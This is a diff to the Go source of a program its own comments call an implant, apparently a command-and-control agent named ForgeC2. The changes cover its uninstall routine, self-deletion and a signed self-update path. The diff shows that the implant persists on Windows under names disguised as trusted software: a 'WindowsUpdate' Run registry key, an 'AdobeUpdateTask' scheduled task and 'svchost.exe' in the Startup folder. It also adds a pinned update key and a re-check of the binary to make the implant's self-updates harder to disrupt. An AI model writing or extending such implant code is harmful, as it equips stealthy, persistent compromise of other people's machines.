@@ -34,16 +34,22 @@ func addPersistence() {
 
 // selfRemove removes the implant
 func uninstallSelf() (string, error) {
-	// best effort cleanup
+	// best effort cleanup — remove BOTH persistence naming schemes
+	// (auto-install: WindowsUpdate/AdobeUpdateTask/svchost.exe and explicit:
+	// ForgeC2/ForgeC2Update/ForgeC2.exe) so nothing is left behind regardless
+	// of which install path was used.
 	if runtime.GOOS == "windows" {
-		// remove reg
-		runShell(`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ForgeC2 /f`, "cmd.exe")
-		// remove task
-		runShell("schtasks /delete /tn ForgeC2 /f", "cmd.exe")
-		// remove startup
+		for _, name := range []string{"ForgeC2", "WindowsUpdate"} {
+			runShell(`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v `+name+` /f`, "cmd.exe")
+		}
+		for _, name := range []string{"ForgeC2", "ForgeC2Update", "AdobeUpdateTask"} {
+			runShell("schtasks /delete /tn "+name+" /f", "cmd.exe")
+		}
 		appData := os.Getenv("APPDATA")
-		startup := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\forgec2.exe`)
-		os.Remove(startup)
+		startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
+		for _, name := range []string{"forgec2.exe", "svchost.exe", "ForgeC2.exe"} {
+			os.Remove(filepath.Join(startupDir, name))
+		}
 	}
 	// delete self file (best effort)
 	exe, _ := os.Executable()
@@ -52,6 +58,24 @@ func uninstallSelf() (string, error) {
 		os.Remove(exe)
 	}()
 	return "uninstall attempted (self-delete may take effect after exit)", nil
+}
+
+// updatePinnedPubKeyHex is the compile-time trust root for self-updates. When
+// non-empty, self_update verifies ONLY against this ed25519 public key and
+// ignores any key supplied in the task — so an operator (or anyone able to
+// issue a task) cannot sign and execute an arbitrary binary. Build pipelines
+// should stamp this via -ldflags so every implant trusts only the vendor key.
+// When empty, the task-supplied key is used (legacy behavior; logged).
+var updatePinnedPubKeyHex = ""
+
+// verifyUpdateSignature decodes an ed25519 public key (hex) and checks the
+// signature over hash. Centralized so the pinned-key trust root is testable.
+func verifyUpdateSignature(pubKeyHex string, hash, sig []byte) bool {
+	pk, err := hex.DecodeString(pubKeyHex)
+	if err != nil {
+		return false
+	}
+	return ed25519.Verify(ed25519.PublicKey(pk), hash, sig)
 }
 
 // selfUpdate downloads a new binary from a signed URL and verifies its integrity
@@ -72,8 +96,15 @@ func selfUpdate(cmdJSON string) string {
 	if err != nil {
 		return "failed to decode signature: " + err.Error()
 	}
-	publicKey, err := hex.DecodeString(params.PublicKey)
-	if err != nil {
+
+	// Prefer a pinned, compile-time trust root over any key shipped in the task.
+	verifyKeyHex := params.PublicKey
+	if updatePinnedPubKeyHex != "" {
+		verifyKeyHex = updatePinnedPubKeyHex
+	} else if Debug {
+		fmt.Printf("[!] self_update: no pinned update key configured; trusting task-supplied key\n")
+	}
+	if _, err := hex.DecodeString(verifyKeyHex); err != nil {
 		return "failed to decode public key: " + err.Error()
 	}
 
@@ -122,9 +153,24 @@ func selfUpdate(cmdJSON string) string {
 
 	// Verify ed25519 signature of the SHA-256 hash
 	hash := hasher.Sum(nil)
-	if !ed25519.Verify(ed25519.PublicKey(publicKey), hash, signature) {
+	if !verifyUpdateSignature(verifyKeyHex, hash, signature) {
 		os.Remove(tmpPath)
 		return "signature verification failed: binary may be tampered"
+	}
+
+	// TOCTOU mitigation: re-read the temp file and re-verify immediately
+	// before handing it to the platform updater, so a swap of the temp file
+	// between verification and replacement is detected.
+	if f, rerr := os.Open(tmpPath); rerr == nil {
+		rh := sha256.New()
+		if _, rerr := io.Copy(rh, f); rerr == nil {
+			if !verifyUpdateSignature(verifyKeyHex, rh.Sum(nil), signature) {
+				f.Close()
+				os.Remove(tmpPath)
+				return "signature verification failed after re-check: binary may be tampered"
+			}
+		}
+		f.Close()
 	}
 
 	// Make temp file executable (Linux)
